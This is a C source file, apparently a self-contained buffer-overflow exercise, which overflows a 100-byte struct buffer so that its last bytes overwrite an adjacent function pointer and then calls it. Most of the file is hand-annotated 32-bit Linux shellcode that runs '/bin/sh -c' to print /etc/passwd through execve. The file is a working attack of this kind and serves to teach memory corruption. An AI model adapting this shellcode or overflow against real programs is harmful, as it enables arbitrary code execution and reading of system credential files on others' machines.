#include <stdio.h>


struct {
    char buffer[100];
    void (*x)();
} y;

void foo();
int main(){

    char *exploit =
	 "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
     "XXXXXXXXXXXXXXXXXXXX"
	 "XXXXXXXXXXXXXXXXXXXX"
     "XXXXXXXXXXXXXXXXXXXX"
	 "WXYZ";

    //100 +4 +1 =105
    char exploit2[105] = {
        0x90,                                               //            105-103-1    //103 is the size of coding as follows in char exploit2[105]
        0x90,                                               //             nop
        0x90,                                               //             nop
        0xEB,0x29,                                          // start:      jmp short codeEnd
        0x5E,                                               // start2:     pop esi
        0x31,0xC0,                                          //             xor eax,eax
        0x88,0x46,0x07,                                     //             mov [byte esi+flagStr-exeStr-2],al
        0x88,0x46,0x0B,                                     //             mov [byte esi+cmdStr-exeStr-1],al
        0x88,0x46,0x20,                                     //             mov [byte esi+arrayAddr-exeStr-1],al
        0x89,0x46,0x2D,                                     //             mov [byte esi+arrayAddr-exeStr+12],eax
        0x89,0x76,0x21,                                     //             mov [byte esi+arrayAddr-exeStr],esi 
        0x8D,0x7E,0x09,                                     //             lea edi,[byte esi+flagStr-exeStr]
        0x89,0x7E,0x25,                                     //             mov [byte esi+arrayAddr-exeStr+4],edi
        0x8D,0x7E,0x0C,                                     //             lea edi,[byte esi+cmdStr-exeStr]
        0x89,0x7E,0x29,                                     //             mov [byte esi+arrayAddr-exeStr+8],edi
        0xB0,0x0B,                                          //             mov al,0x0b
        0x89,0xF3,                                          //             mov ebx,esi
        0x8D,0x4E,0x21,                                     //             lea ecx,[byte esi+arrayAddr-exeStr]
        0x31,0xD2,                                          //             xor edx,edx
        0xCD,0x80,                                          //             int 0x80
        0xE8,0xD2,0xFF,0xFF,0xFF,                           // codeEnd:    call start2
        0x2F,0x62,0x69,0x6E,0x2F,0x73,0x68,0x58,0x79,       // exeStr:     db "/bin/shXy"
        0x2D,0x63,0x58,                                     // flagStr:    db "-cX"
        0x63,0x61,0x74,0x20,0x2F,0x65,0x74,0x63,0x2F,       // cmdStr:     db "cat /etc/passwd;exitX"
        0x70,0x61,0x73,0x73,0x77,0x64,0x3B,0x65,0x78,       //
        0x69,0x74,0x58,                                     //
        0xFF,0xFF,0xFF,0xFF,                                // arrayAddr:  dd 0xffffffff
        0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
        0xFF,0xFF,0xFF,0xFF,                                //             dd 0xffffffff
        0xFF,0xFF,0xFF,0xFF,                                 //            dd 0xffffffff
        0x40,0x97,0x04,0x08,                                 // beginning address
        0x00

    };

    int i;

    y.x = foo;
    for (i = 0; exploit2[i]; i++){
	y.buffer[i] = exploit2[i];
    }

    (*y.x)();
}


void foo(){
   printf("%s %x\n", y.buffer, &y.x);
}


